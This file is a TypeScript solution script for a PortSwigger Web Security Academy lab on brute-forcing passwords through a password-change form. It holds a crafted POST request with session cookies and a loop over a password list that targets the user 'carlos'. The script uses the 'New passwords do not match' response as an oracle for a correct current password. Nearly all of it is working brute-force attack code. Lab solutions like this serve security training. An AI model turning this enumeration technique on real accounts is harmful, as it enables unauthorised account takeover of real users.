/**
 * PortSwigger Lab: Password brute force via password change
 * https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
 */

import { PASSWORDS, Sess } from "../base"

const LABID = "0adc0027034255f682b4160b000b002c"

const iter = async (usnm: string, pswd: string) => {
	const r2 = await Sess.req`
		POST https://${LABID}.web-security-academy.net/my-account/change-password HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=xuDNp22rar8mSp5SDL2QjvHDkQwaaZmN; session=cyiCBiX6qb7hHlfSqUk5EmVQmx4VmVU0
		Content-Length: 78
		Cache-Control: max-age=0
		Sec-Ch-Ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		Origin: https://${LABID}.web-security-academy.net
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.5
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/my-account?id=wiener
		Accept-Encoding: gzip, deflate, br

		username=${usnm}&current-password=${pswd}&new-password-1=abc&new-password-2=123
	`

	return r2.body().includes("New passwords do not match")
}

for (const P of PASSWORDS) {
	if (await iter("carlos", P)) {
		console.log("PASSWORD SUCCESS:", P)
		break
	} else {
		console.log("PASSWORD FAILURE:", P)
	}
}
